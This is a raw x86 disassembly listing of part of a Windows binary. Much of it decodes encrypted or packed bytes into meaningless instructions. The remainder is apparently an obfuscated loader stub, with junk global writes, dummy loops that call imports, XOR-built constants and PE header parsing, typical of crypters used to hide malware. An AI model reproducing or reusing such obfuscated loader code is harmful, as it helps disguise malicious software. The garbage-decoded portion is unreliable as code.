  404a2d:	shl    DWORD PTR [edi],1
  404a2f:	shl    ecx,1
  404a31:	lods   al,BYTE PTR ds:[esi]
  404a32:	mov    ds:0x4c35c47c,eax
  404a37:	in     al,dx
  404a38:	jbe    0x404a5f
  404a3a:	jo     0x404a70
  404a3c:	or     al,0xd3
  404a3e:	push   ds
  404a3f:	pop    di
  404a41:	xor    eax,0x3ac6ce56
  404a46:	jg     0x404a95
  404a48:	mov    al,0xf
  404a4a:	fwait
  404a4b:	outs   dx,DWORD PTR ds:[esi]
  404a4c:	sub    BYTE PTR [ebx+0x44],dl
  404a4f:	push   0xc6e0059c
  404a54:	scas   al,BYTE PTR es:[edi]
  404a55:	mov    bh,0xb0
  404a57:	xchg   DWORD PTR [ecx+0x6e],esp
  404a5a:	mov    ds:0x4f3fe010,al
  404a5f:	and    eax,0x3b5b0a79
  404a64:	lods   al,BYTE PTR ds:[esi]
  404a65:	test   DWORD PTR [edx],edi
  404a67:	or     dl,ah
  404a69:	int3   
  404a6a:	dec    esi
  404a6b:	mov    dl,0xde
  404a6d:	into   
  404a6e:	pop    ds
  404a6f:	stc    
  404a70:	jne    0x404a0f
  404a72:	pop    ds
  404a73:	retf   
  404a74:	mov    eax,ds:0x5266ad3c
  404a79:	cmp    bh,BYTE PTR [edx]
  404a7b:	shl    BYTE PTR [eax-0x47d8d15f],cl
  404a81:	pop    ebx
  404a82:	repz sub BYTE PTR [edx],dl
  404a85:	in     al,dx
  404a86:	hlt    
  404a87:	jle    0x404a96
  404a89:	push   ebx
  404a8a:	jns    0x404a9a
  404a8c:	gs mov eax,0x45cddb56
  404a92:	xor    ebp,DWORD PTR [ecx-0x18c1bcfd]
  404a98:	push   ebp
  404a99:	je     0x404ac6
  404a9b:	clc    
  404a9c:	pusha  
  404a9d:	xchg   esi,eax
  404a9e:	mov    dh,0xc5
  404aa0:	mov    WORD PTR [edi+0xc],cs
  404aa3:	loopne 0x404ab0
  404aa5:	jg     0x404a34
  404aa7:	dec    ebx
  404aa8:	test   DWORD PTR [eax],ebx
  404aaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404aab:	pop    edx
  404aac:	xchg   BYTE PTR [eax-0x44],dl
  404aaf:	andps  xmm7,XMMWORD PTR [ebp+0x5377455d]
  404ab6:	xor    BYTE PTR [ebp-0x20],bh
  404ab9:	repz push DWORD PTR [esi-0x26a7bca2]
  404ac0:	or     eax,0xe21c4304
  404ac5:	jbe    0x404af7
  404ac7:	cmp    eax,0xc476a580
  404acc:	sbb    ebp,esi
  404ace:	cs xor ch,ah
  404ad1:	ja     0x404aab
  404ad3:	hlt    
  404ad4:	in     al,dx
  404ad5:	lahf   
  404ad6:	jae    0x404a78
  404ad8:	sbb    BYTE PTR [edx+edx*2+0x2c],0x56
  404add:	das    
  404ade:	push   ds
  404adf:	and    cl,cl
  404ae1:	loopne 0x404a6b
  404ae3:	adc    eax,DWORD PTR [ebx+0xc8802af]
  404ae9:	int3   
  404aea:	pop    ebp
  404aeb:	aaa    
  404aec:	mov    eax,ds:0x6d3dc08a
  404af1:	stos   BYTE PTR es:[edi],al
  404af2:	or     esi,ebx
  404af4:	clc    
  404af5:	sti    
  404af6:	jmp    0x39bcc9b0
  404afb:	jle    0x404b4b
  404afd:	dec    ecx
  404afe:	(bad)  
  404aff:	ja     0x404a82
  404b01:	aam    0xba
  404b03:	ss in  al,dx
  404b05:	pop    ebx
  404b06:	fs inc edx
  404b08:	or     BYTE PTR [edx-0x1ebcc4b3],bh
  404b0e:	cld    
  404b0f:	adc    eax,0xf0093ee1
  404b14:	mov    esi,0x13f045d9
  404b19:	jmp    0x7d78:0xb5e6afdb
  404b20:	jmp    0x8b92:0x13e33f67
  404b27:	lock out 0xfa,al
  404b2a:	ja     0x404b8b
  404b2c:	outs   dx,DWORD PTR ds:[esi]
  404b2d:	scas   al,BYTE PTR es:[edi]
  404b2e:	pcmpgtw mm1,QWORD PTR [edi-0x5c]
  404b32:	adc    ah,ah
  404b34:	inc    esi
  404b35:	cwde   
  404b36:	pushf  
  404b37:	mul    BYTE PTR [edi-0x6361f4b2]
  404b3d:	(bad)  
  404b3e:	aad    0x61
  404b40:	out    0x67,al
  404b42:	ret    0x926f
  404b45:	retf   0xcba
  404b48:	lods   eax,DWORD PTR ds:[esi]
  404b49:	cmp    DWORD PTR [esi-0x4d],esi
  404b4c:	idiv   esi
  404b4e:	je     0x404b99
  404b50:	repz push ss
  404b52:	aam    0xd9
  404b54:	mov    ds:0x52df552f,al
  404b59:	sub    al,0xd5
  404b5b:	mov    ebp,0xb3a6261b
  404b60:	clc    
  404b61:	imul   edi,eax,0x6e
  404b64:	shl    ebx,cl
  404b66:	and    eax,0xd3d2a4c7
  404b6b:	ret    0xdb95
  404b6e:	fistp  WORD PTR [ebp-0x5]
  404b71:	xor    DWORD PTR [esi],edx
  404b73:	ins    DWORD PTR es:[edi],dx
  404b74:	in     al,0x19
  404b76:	cs retf 0x111c
  404b7a:	push   0xffffffa6
  404b7c:	shl    esi,cl
  404b7e:	adc    eax,DWORD PTR [ebx+0x46ce4eaf]
  404b84:	mov    al,0xcf
  404b86:	adc    al,0x31
  404b88:	add    al,0x38
  404b8a:	sbb    al,0x80
  404b8c:	and    al,0xa3
  404b8e:	jne    0x404c0b
  404b90:	or     BYTE PTR [ebx+ebx*2],dh
  404b93:	mov    ah,bh
  404b95:	push   edi
  404b96:	shr    BYTE PTR [edx+0x3f098d66],0xe7
  404b9d:	pop    esp
  404b9e:	mov    edx,0x320f6720
  404ba3:	in     al,dx
  404ba4:	ror    BYTE PTR [ebp-0x42],1
  404ba7:	retf   
  404ba8:	ins    DWORD PTR es:[edi],dx
  404ba9:	fdiv   DWORD PTR [edi+0x5]
  404bac:	cmp    DWORD PTR [eax],ebx
  404bae:	int    0xe5
  404bb0:	xor    BYTE PTR [ebp+0x2e],bh
  404bb3:	sub    eax,ebx
  404bb5:	aas    
  404bb6:	sti    
  404bb7:	das    
  404bb8:	test   BYTE PTR [ebp+0x65dd6b20],0xd4
  404bbf:	xor    BYTE PTR [ecx+0x1b],ch
  404bc2:	(bad)  
  404bc3:	dec    edi
  404bc4:	call   0xc4d53dd1
  404bc9:	mov    eax,ds:0x480ef1c2
  404bce:	mov    bh,0x52
  404bd0:	outs   dx,BYTE PTR ds:[esi]
  404bd1:	imul   edx,eax,0xd
  404bd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bd5:	mov    BYTE PTR [edi-0xd48401e],cl
  404bdb:	dec    edx
  404bdc:	add    DWORD PTR [ecx+0x31],eax
  404bdf:	stos   BYTE PTR es:[edi],al
  404be0:	cmp    eax,0xcc3f05ae
  404be5:	dec    esi
  404be6:	adc    BYTE PTR [esi+edx*2],bl
  404be9:	cmp    eax,0x3b8115fa
  404bee:	jb     0x404c1f
  404bf0:	enter  0x43af,0x2c
  404bf4:	sbb    ah,BYTE PTR ds:0x8a8a7ce3
  404bfa:	fmul   DWORD PTR [eax]
  404bfc:	ja     0x404bcb
  404bfe:	mov    dh,0x96
  404c00:	mov    dh,0xc2
  404c02:	lahf   
  404c03:	(bad)  
  404c04:	xchg   BYTE PTR [eax+0x45c93cf1],cl
  404c0a:	xor    esi,esp
  404c0c:	pop    edx
  404c0d:	mov    ds:0xf3bb854a,eax
  404c12:	fld    DWORD PTR [edx]
  404c14:	sti    
  404c15:	in     eax,0x1c
  404c17:	fld    TBYTE PTR [ecx-0x7577ea94]
  404c1d:	jmp    0x404c6c
  404c1f:	dec    esi
  404c20:	mov    WORD PTR [eax+0x7e83175e],gs
  404c26:	(bad)  [ebx+0x5eadc334]
  404c2c:	rcr    BYTE PTR [ebp-0x4e4cf680],cl
  404c32:	les    ebp,FWORD PTR [ecx-0x5c]
  404c35:	push   ds
  404c36:	jno    0x404bcc
  404c38:	or     ebx,DWORD PTR ds:0xa2060f42
  404c3e:	test   al,0x6
  404c40:	pop    esp
  404c41:	lock das 
  404c43:	xchg   ecx,eax
  404c44:	stos   DWORD PTR es:[edi],eax
  404c45:	nop
  404c46:	sbb    eax,0x57be6460
  404c4b:	mov    dh,0xae
  404c4d:	aas    
  404c4e:	fisttp QWORD PTR [esi]
  404c50:	out    dx,al
  404c51:	lds    ebp,FWORD PTR [eax+0x511933b8]
  404c57:	adc    DWORD PTR [eax-0x76],esp
  404c5a:	mov    ecx,0xcae0a744
  404c5f:	add    esp,DWORD PTR [ebx+0x49647734]
  404c65:	rcr    DWORD PTR [esi+eiz*1-0x7480f1de],cl
  404c6c:	ret    
  404c6d:	push   eax
  404c6e:	push   eax
  404c6f:	sub    ebx,ecx
  404c71:	adc    eax,0xe213cfbe
  404c76:	sub    dl,BYTE PTR [ecx-0x4c]
  404c79:	leave  
  404c7a:	sub    dl,BYTE PTR [ebx-0x784a6036]
  404c80:	push   edi
  404c81:	popa   
  404c82:	pop    esp
  404c83:	and    eax,0x6bf70de7
  404c88:	mov    dl,BYTE PTR [edx]
  404c8a:	ret    
  404c8b:	jbe    0x404cdb
  404c8d:	popf   
  404c8e:	fistp  DWORD PTR [ebx]
  404c90:	out    0xf7,eax
  404c92:	bound  ebx,QWORD PTR [ebx-0x6187e4e5]
  404c98:	lea    ebp,[ecx-0x49]
  404c9b:	xchg   edi,eax
  404c9c:	push   0x6e
  404c9e:	or     ah,BYTE PTR [edx-0xec0ca66]
  404ca4:	cmp    al,0xbb
  404ca6:	mov    DWORD PTR [edi-0x7d54ee0b],edi
  404cac:	fist   DWORD PTR [ebx-0x3e]
  404caf:	aad    0xb8
  404cb1:	jmp    0x7258012e
  404cb6:	xlat   BYTE PTR ds:[ebx]
  404cb7:	fbstp  TBYTE PTR [ecx-0x69]
  404cba:	xchg   ebx,eax
  404cbb:	ds (bad) 
  404cbd:	es hlt 
  404cbf:	and    BYTE PTR [esi-0x551f454e],dh
  404cc5:	and    DWORD PTR [edi+ebp*8+0x5fc0a401],0x2acde0b
  404cd0:	sub    ebx,edi
  404cd2:	pop    ebp
  404cd3:	out    dx,al
  404cd4:	inc    esi
  404cd5:	add    DWORD PTR [ecx],esi
  404cd7:	sbb    BYTE PTR [ecx+eiz*1-0x3ab69152],dl
  404cde:	sbb    DWORD PTR [ebp-0x45da8d39],esi
  404ce4:	ins    BYTE PTR es:[edi],dx
  404ce5:	mov    edi,DWORD PTR [eax]
  404ce7:	dec    esi
  404ce8:	xor    ah,BYTE PTR [ebp+0x32ca3d53]
  404cee:	std    
  404cef:	out    dx,al
  404cf0:	repnz stos BYTE PTR es:[edi],al
  404cf2:	ret    
  404cf3:	aam    0x77
  404cf5:	aad    0xcf
  404cf7:	mov    eax,ds:0xb2205f52
  404cfc:	shl    ecx,1
  404cfe:	push   ss
  404cff:	ss aaa 
  404d01:	adc    ah,bl
  404d03:	push   eax
  404d04:	pop    ebp
  404d06:	shr    DWORD PTR ds:0x33215d05,1
  404d0c:	nop
  404d0d:	cmc    
  404d0e:	mov    bh,0x97
  404d10:	xchg   DWORD PTR [edx-0x7b315a18],ebp
  404d16:	stos   DWORD PTR es:[edi],eax
  404d17:	imul   ebp,DWORD PTR [eax+0x1bf56573],0x2a
  404d1e:	sub    bl,BYTE PTR [edx-0x7]
  404d21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d22:	lea    eax,[edx+0x35]
  404d25:	stc    
  404d26:	mov    ah,0x41
  404d28:	push   0xffffffe6
  404d2a:	cli    
  404d2b:	ds mov ds,edi
  404d2e:	jge    0x404d26
  404d30:	mov    gs,esi
  404d32:	push   0x1
  404d34:	push   sp
  404d36:	jp     0x404d69
  404d38:	popf   
  404d39:	int    0x5d
  404d3b:	cmp    dh,BYTE PTR [edx+edi*1-0x13]
  404d3f:	jns    0x404d57
  404d41:	bound  esp,QWORD PTR [ebx+ecx*4]
  404d44:	(bad)  
  404d46:	inc    ebp
  404d47:	jge    0x404d84
  404d49:	sub    BYTE PTR [eax-0x1beac468],ch
  404d4f:	xor    edx,DWORD PTR [ebp-0x2a7c1c09]
  404d55:	cmc    
  404d56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d57:	push   esi
  404d58:	lods   al,BYTE PTR ds:[esi]
  404d59:	out    0x1b,eax
  404d5b:	and    ebx,DWORD PTR [edi]
  404d5d:	mov    bl,al
  404d5f:	push   ss
  404d60:	cmp    al,0x20
  404d62:	xchg   esi,eax
  404d63:	add    BYTE PTR [ebp+0xe],ah
  404d66:	add    BYTE PTR [eax+0x3c],ah
  404d69:	repz or esp,DWORD PTR [ebx+0x1ab6e8d7]
  404d70:	dec    esi
  404d71:	repnz push ebx
  404d73:	call   0x32c5fe29
  404d78:	adc    esp,DWORD PTR [ebx]
  404d7a:	gs jmp 0xe593:0x63d03548
  404d82:	dec    eax
  404d83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d84:	popa   
  404d85:	mov    bh,0x70
  404d87:	and    al,0xd7
  404d89:	js     0x404d39
  404d8b:	and    BYTE PTR [edx],al
  404d8d:	scas   al,BYTE PTR es:[edi]
  404d8e:	mov    eax,ds:0xf4e26c90
  404d93:	sub    ecx,eax
  404d95:	repnz push 0xffffff9b
  404d98:	mov    dl,0x17
  404d9a:	xchg   DWORD PTR [ebp+0x7d],ebx
  404d9d:	push   esi
  404d9e:	out    0x86,al
  404da0:	xor    DWORD PTR [edx],0xffffffc7
  404da3:	adc    BYTE PTR [edx+esi*2-0x3b4fbaa],dl
  404daa:	mov    al,0xec
  404dac:	xchg   edi,eax
  404dad:	pop    es
  404dae:	inc    esi
  404daf:	dec    ecx
  404db0:	ja     0x404dd7
  404db2:	jmp    0x404d7e
  404db4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404db5:	mov    ebx,DWORD PTR [esi+0x3dc472e5]
  404dbb:	outs   dx,BYTE PTR ds:[esi]
  404dbc:	sbb    ebx,DWORD PTR [ecx]
  404dbe:	inc    edx
  404dbf:	adc    BYTE PTR [esi+0x2141e2cc],ah
  404dc5:	dec    ebx
  404dc6:	jne    0x404e34
  404dc8:	les    eax,FWORD PTR [esi+eiz*1-0x45]
  404dcc:	repz mov ebp,0x32eb9d0
  404dd2:	sub    edi,0xffffffd5
  404dd5:	out    dx,al
  404dd6:	dec    esp
  404dd7:	retf   0xf828
  404dda:	loope  0x404d8a
  404ddc:	les    ebp,FWORD PTR [esi]
  404dde:	mov    ebp,0x5f57025c
  404de3:	push   ds
  404de4:	das    
  404de5:	mov    bl,0xa8
  404de7:	jle    0x404da4
  404de9:	xchg   ebx,eax
  404dea:	fld    DWORD PTR [ecx+eiz*4-0x25f907e3]
  404df1:	out    0x34,eax
  404df3:	daa    
  404df4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404df5:	retf   0x360c
  404df8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404df9:	arpl   WORD PTR [ebp+0x75],ax
  404dfc:	les    ecx,FWORD PTR [edx-0xd470916]
  404e02:	xor    DWORD PTR [ebx+0x4ea688cd],esp
  404e08:	pop    ecx
  404e09:	cmc    
  404e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e0b:	pop    esi
  404e0c:	mov    bl,0xf7
  404e0e:	sbb    ebp,DWORD PTR [edi+0x5a]
  404e11:	out    0x68,al
  404e13:	ret    
  404e14:	adc    dl,0x7d
  404e17:	scas   eax,DWORD PTR es:[di]
  404e19:	loopne 0x404e59
  404e1b:	mov    al,ds:0x6dd4edf4
  404e20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e21:	mov    al,0xe2
  404e23:	hlt    
  404e24:	cmp    edi,esi
  404e26:	shr    BYTE PTR [ebx],0x2e
  404e29:	fild   WORD PTR [ebx+0x40671bf]
  404e2f:	or     DWORD PTR [edi],0xffffffee
  404e32:	xchg   esi,eax
  404e33:	and    bh,BYTE PTR es:[eax+0x29a8424c]
  404e3a:	push   0x4d313534
  404e3f:	xor    edi,DWORD PTR [esi+eiz*8+0x2f265114]
  404e46:	or     dl,BYTE PTR [eax+0x1a63a777]
  404e4c:	cmp    ebx,ebx
  404e4e:	imul   ebx,DWORD PTR [edx],0x2a
  404e51:	mov    esp,0xf29da746
  404e56:	pusha  
  404e57:	cmp    BYTE PTR [edi-0x5be6dd4],0xce
  404e5e:	iret   
  404e5f:	int    0x31
  404e61:	push   esi
  404e62:	pop    ebx
  404e63:	fstp   TBYTE PTR [edx]
  404e65:	push   cs
  404e66:	enter  0x643a,0xd
  404e6a:	leave  
  404e6b:	loopne 0x404df5
  404e6d:	scas   al,BYTE PTR es:[edi]
  404e6e:	push   edx
  404e6f:	push   esi
  404e70:	adc    BYTE PTR [esi+ebp*2],dh
  404e73:	pop    es
  404e74:	sbb    al,0x29
  404e76:	ret    
  404e77:	mov    ebp,0x43e0174b
  404e7c:	test   al,0x78
  404e7e:	sbb    ch,ah
  404e80:	call   0xbeba:0xbced9488
  404e87:	out    dx,al
  404e88:	xchg   ebp,eax
  404e89:	jnp    0x404e23
  404e8b:	lahf   
  404e8c:	fwait
  404e8d:	sar    BYTE PTR [edx],cl
  404e8f:	pop    esp
  404e90:	js     0x404e7a
  404e92:	sahf   
  404e93:	mov    bl,al
  404e95:	inc    esp
  404e96:	sbb    al,0xae
  404e98:	or     ch,BYTE PTR [ecx-0x17abf887]
  404e9e:	ret    
  404e9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ea0:	mov    esp,0xfb7a1c0e
  404ea5:	xor    DWORD PTR [ecx-0x4da5a17c],eax
  404eab:	sbb    BYTE PTR [eax-0x7c8e71d0],ch
  404eb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404eb2:	ja     0x404f12
  404eb4:	test   eax,0xc030a4dd
  404eb9:	es pop es
  404ebb:	out    dx,al
  404ebc:	mov    ds:0x8e01c0ff,al
  404ec1:	push   edx
  404ec2:	leave  
  404ec3:	fiadd  WORD PTR [edx-0x745bb44a]
  404ec9:	xchg   ecx,eax
  404eca:	or     esi,DWORD PTR [ebx-0x7c]
  404ecd:	cmc    
  404ece:	loopne 0x404f4f
  404ed0:	add    esi,DWORD PTR ds:0x8931962d
  404ed6:	mov    al,ds:0x13539c5c
  404edb:	into   
  404edc:	bound  edi,QWORD PTR [edi+edi*4+0x2ec8f393]
  404ee3:	rol    DWORD PTR [ebx],1
  404ee5:	mov    eax,0xff5cdb70
  404eea:	push   eax
  404eeb:	into   
  404eec:	bound  edi,QWORD PTR [esi+0x21]
  404eef:	push   edi
  404ef0:	mov    bl,0x41
  404ef2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ef3:	aam    0x45
  404ef5:	loop   0x404f6e
  404ef7:	daa    
  404ef8:	sar    BYTE PTR [edx],cl
  404efa:	dec    ecx
  404efb:	out    dx,al
  404efc:	cmc    
  404efd:	jne    0x404efc
  404eff:	jg     0x404ea6
  404f01:	add    ebx,ebp
  404f03:	sahf   
  404f04:	mov    bh,0x74
  404f06:	je     0x404f35
  404f08:	fs int 0xba
  404f0b:	repz sbb dh,ah
  404f0e:	fcomp  QWORD PTR [ecx]
  404f10:	pop    eax
  404f11:	(bad)  
  404f12:	imul   esi,DWORD PTR [ebp+0xf017a1b],0x4f
  404f19:	outs   dx,DWORD PTR ds:[esi]
  404f1a:	and    al,0x59
  404f1c:	xor    BYTE PTR [edi+0x13],bl
  404f1f:	mov    ds:0xa9d44fd7,al
  404f24:	gs mov dh,0x81
  404f27:	ss xor BYTE PTR ds:[bp+di],al
  404f2c:	(bad)  
  404f2e:	in     eax,0x8b
  404f30:	inc    ebp
  404f31:	cld    
  404f32:	mov    edi,DWORD PTR [ebp-0x8]
  404f35:	xor    edi,edx
  404f37:	add    edi,esi
  404f39:	mov    esi,DWORD PTR [ebp+0x8]
  404f3c:	imul   edi,ecx
  404f3f:	mov    ebx,DWORD PTR [ebp+0xc]
  404f42:	xor    eax,edx
  404f44:	add    eax,ecx
  404f46:	mov    al,BYTE PTR [ebx+eax*1+0x3272dd]
  404f4d:	mov    BYTE PTR [edi+esi*1],al
  404f50:	mov    eax,DWORD PTR [ebp-0x8]
  404f53:	mov    esi,DWORD PTR [ebp+0x10]
  404f56:	xor    eax,edx
  404f58:	xor    ebx,ebx
  404f5a:	add    esi,0xfabdbeed
  404f60:	adc    ebx,0xffffffff
  404f63:	lea    ecx,[ecx+eax*1+0x3272dd]
  404f6a:	xor    edi,edi
  404f6c:	xor    esi,0x8a29a127
  404f72:	xor    ebx,0x0
  404f75:	mov    eax,ecx
  404f77:	add    eax,0xfabdbeed
  404f7c:	adc    edi,0xffffffff
  404f7f:	xor    eax,0x8a29a127
  404f84:	xor    edi,0x0
  404f87:	cmp    eax,esi
  404f89:	jne    0x402b72
  404f8f:	cmp    edi,ebx
  404f91:	jne    0x402b72
  404f97:	mov    eax,0xf89c85b2
  404f9c:	pop    ebx
  404f9d:	pop    edi
  404f9e:	pop    esi
  404f9f:	leave  
  404fa0:	ret    0xc
  404fa3:	push   ebp
  404fa4:	mov    ebp,esp
  404fa6:	push   ecx
  404fa7:	add    eax,DWORD PTR ds:0x42a000
  404fad:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  404fb4:	sbb    DWORD PTR ds:0x42b008,0x61d9
  404fbe:	mov    eax,DWORD PTR [ebp+0x8]
  404fc1:	xor    DWORD PTR ds:0x42c018,0x2d2e
  404fcb:	mov    al,BYTE PTR [eax]
  404fcd:	add    al,0xb
  404fcf:	xor    al,0x71
  404fd1:	cmp    al,0x29
  404fd3:	mov    DWORD PTR ds:0x429010,0x6c7b
  404fdd:	jne    0x40507a
  404fe3:	mov    eax,DWORD PTR [ebp+0x8]
  404fe6:	or     edx,DWORD PTR ds:0x42900c
  404fec:	mov    ecx,DWORD PTR [ebp+0x8]
  404fef:	and    DWORD PTR ds:0x42b00c,0x0
  404ff9:	mov    edx,DWORD PTR ds:0x42b00c
  404fff:	inc    edx
  405000:	mov    DWORD PTR ds:0x42b00c,edx
  405006:	cmp    DWORD PTR ds:0x42b00c,0x1a
  40500d:	jne    0x40501e
  405013:	push   0x42900c
  405018:	call   DWORD PTR ds:0x42ed75
  40501e:	cmp    DWORD PTR ds:0x42b00c,0x15
  405025:	jb     0x404ff9
  40502b:	or     DWORD PTR ds:0x42d008,0x1488
  405035:	add    ecx,DWORD PTR [eax+0x3c]
  405038:	mov    edx,0x7510896
  40503d:	mov    DWORD PTR [ebp+0x8],ecx
  405040:	mov    eax,DWORD PTR [ebp-0x4]
  405043:	xor    eax,edx
  405045:	push   esi
  405046:	mov    esi,DWORD PTR ds:0x42d000
  40504c:	and    DWORD PTR ds:0x42a00c,esi
  405052:	mov    esi,DWORD PTR [ebp+0x8]
  405055:	mov    ecx,0x3272dd
  40505a:	add    eax,ecx
  40505c:	cmp    DWORD PTR [esi+0x54],eax
  40505f:	pop    esi
  405060:	je     0x40506e
  405066:	mov    eax,DWORD PTR [ebp+0x8]
  405069:	jmp    0x405087
  40506e:	mov    eax,DWORD PTR [ebp-0x4]
  405071:	xor    eax,edx
  405073:	add    eax,ecx
  405075:	jmp    0x405087
  40507a:	mov    eax,DWORD PTR [ebp-0x4]
  40507d:	xor    eax,0x7510896
  405082:	add    eax,0x3272dd
  405087:	leave  
  405088:	ret    0x4
  40508b:	push   ebp
  40508c:	mov    ebp,esp
  40508e:	sub    esp,0x78
  405091:	push   ebx
  405092:	push   esi
  405093:	push   edi
  405094:	push   0x1f
  405096:	lea    eax,[ebp-0x78]
  405099:	xor    DWORD PTR ds:0x429018,0x42a014
  4050a3:	push   eax
  4050a4:	push   0x0
  4050a6:	mov    DWORD PTR ds:0x429010,0x21c3
  4050b0:	call   DWORD PTR ds:0x42ed69
  4050b6:	add    DWORD PTR ds:0x429024,0x42c000
  4050c0:	push   0x97898797
  4050c5:	call   DWORD PTR ds:0x42ed2d
  4050cb:	adc    DWORD PTR ds:0x42b018,0x6ca1
  4050d5:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4050dc:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  4050e3:	mov    ecx,DWORD PTR [ebp-0x4]
  4050e6:	mov    ebx,0x7510896
  4050eb:	add    DWORD PTR ds:0x42a014,0x255d
  4050f5:	xor    ecx,ebx
  4050f7:	or     DWORD PTR ds:0x429000,0x7ff8
  405101:	mov    eax,0x3272dd
  405106:	add    ecx,eax
  405108:	mov    DWORD PTR [ebp-0x1c],ecx
  40510b:	not    DWORD PTR ds:0x42c018
  405111:	mov    ecx,DWORD PTR [ebp+0x14]
  405114:	test   ecx,ecx
  405116:	mov    DWORD PTR ds:0x42a00c,0x3f58
  405120:	je     0x40513a
  405126:	inc    ecx
  405127:	mov    ecx,DWORD PTR [ebp+0x14]
  40512a:	and    DWORD PTR ds:0x429014,0x1a66
  405134:	mov    ecx,DWORD PTR [ecx]
  405136:	dec    edi
  405137:	mov    DWORD PTR [ebp-0x1c],ecx
  40513a:	add    DWORD PTR ds:0x42901c,edx
  405140:	mov    ecx,0x7665
  405145:	and    DWORD PTR ds:0x42c008,0x0
  40514f:	jmp    0x405161
  405154:	mov    edi,DWORD PTR ds:0x42c008
  40515a:	inc    edi
  40515b:	mov    DWORD PTR ds:0x42c008,edi
  405161:	cmp    DWORD PTR ds:0x42c008,0x10
  405168:	jae    0x405192
  40516e:	cmp    DWORD PTR ds:0x42c008,0x1f
  405175:	jne    0x40518b
  40517b:	push   0x399e
  405180:	push   0x848f
  405185:	call   DWORD PTR ds:0x42ed35
  40518b:	jmp    0x405154
  405190:	xor    edi,edi
  405192:	imul   edx,eax
  405195:	movzx  esi,BYTE PTR ds:0x42c010
  40519c:	xor    DWORD PTR ds:0x42c004,esi
  4051a2:	mov    esi,0x76532
  4051a7:	add    edx,ecx
  4051a9:	and    DWORD PTR ds:0x42a018,0x0
  4051b3:	mov    edi,DWORD PTR ds:0x42a018
  4051b9:	inc    edi
  4051ba:	mov    DWORD PTR ds:0x42a018,edi
  4051c0:	cmp    DWORD PTR ds:0x42a018,0x6
  4051c7:	jne    0x4051e0
  4051cd:	push   0x8802
  4051d2:	push   0x429004
  4051d7:	push   DWORD PTR [ebp-0x24]
  4051da:	call   DWORD PTR ds:0x42ed39
  4051e0:	cmp    DWORD PTR ds:0x42a018,0x5
  4051e7:	jne    0x4051fa
  4051ed:	mov    edi,DWORD PTR ds:0x42a018
  4051f3:	inc    edi
  4051f4:	mov    DWORD PTR ds:0x42a018,edi
  4051fa:	cmp    DWORD PTR ds:0x42a018,0x10
  405201:	jb     0x4051b3
  405207:	and    DWORD PTR ds:0x42d00c,0x0
  405211:	jmp    0x405223
  405216:	mov    edi,DWORD PTR ds:0x42d00c
  40521c:	inc    edi
  40521d:	mov    DWORD PTR ds:0x42d00c,edi
  405223:	cmp    DWORD PTR ds:0x42d00c,0x15
  40522a:	jae    0x405278
  405230:	cmp    DWORD PTR ds:0x42d00c,0xa
  405237:	jne    0x40524d
  40523d:	push   0x42e05b
  405242:	push   0x42e010
  405247:	call   DWORD PTR ds:0x42ed3d
  40524d:	cmp    DWORD PTR ds:0x42d00c,0x9
  405254:	jne    0x405269
  40525a:	xor    edi,edi
  40525c:	or     edi,DWORD PTR ds:0x42d00c
  405262:	inc    edi
  405263:	mov    DWORD PTR ds:0x42d00c,edi
  405269:	jmp    0x405216
  40526e:	adc    DWORD PTR ds:0x42b000,0x4b16
  405278:	xchg   esi,ecx
  40527a:	xor    ecx,DWORD PTR ds:0x42a00c
  405280:	mov    edi,0x54354
  405285:	sub    edx,edi
  405287:	sbb    ecx,0x55bb
  40528d:	mov    ecx,DWORD PTR [ebp-0x4]
  405290:	sub    DWORD PTR ds:0x42a01c,edx
  405296:	xor    ecx,ebx
  405298:	mov    esi,DWORD PTR ds:0x42a018
  40529e:	and    esi,DWORD PTR ds:0x429000
  4052a4:	mov    DWORD PTR ds:0x42a018,esi
  4052aa:	add    ecx,eax
  4052ac:	mov    DWORD PTR [ebp-0x8],ecx
  4052af:	and    DWORD PTR ds:0x42b010,0x0
  4052b9:	jmp    0x4052cb
  4052be:	mov    esi,DWORD PTR ds:0x42b010
  4052c4:	inc    esi
  4052c5:	mov    DWORD PTR ds:0x42b010,esi
  4052cb:	cmp    DWORD PTR ds:0x42b010,0x1e
  4052d2:	jae    0x405313
  4052d8:	cmp    DWORD PTR ds:0x42b010,0x4
  4052df:	jne    0x4052f4
  4052e5:	push   DWORD PTR [ebp-0x1c]
  4052e8:	push   DWORD PTR [ebp-0x20]
  4052eb:	push   DWORD PTR [ebp-0xc]
  4052ee:	call   DWORD PTR ds:0x42ed41
  4052f4:	cmp    DWORD PTR ds:0x42b010,0x3
  4052fb:	jne    0x40530e
  405301:	mov    esi,DWORD PTR ds:0x42b010
  405307:	inc    esi
  405308:	mov    DWORD PTR ds:0x42b010,esi
  40530e:	jmp    0x4052be
  405313:	mov    ecx,DWORD PTR [ebp-0x14]
  405316:	xor    ecx,ebx
  405318:	add    ecx,eax
  40531a:	and    DWORD PTR ds:0x42a00c,0x4b6f
  405324:	mov    DWORD PTR [ebp-0x24],ecx
  405327:	mov    DWORD PTR ds:0x429024,0x1f
  405331:	cmp    DWORD PTR ds:0x429024,0x0
  405338:	je     0x405390
  40533e:	cmp    DWORD PTR ds:0x429024,0x6
  405345:	jne    0x40535e
  40534b:	push   0x5506
  405350:	push   0x42b000
  405355:	push   DWORD PTR [ebp-0x28]
  405358:	call   DWORD PTR ds:0x42ed45
  40535e:	cmp    DWORD PTR ds:0x429024,0x7
  405365:	jne    0x405378
  40536b:	mov    ecx,DWORD PTR ds:0x429024
  405371:	dec    ecx
  405372:	mov    DWORD PTR ds:0x429024,ecx
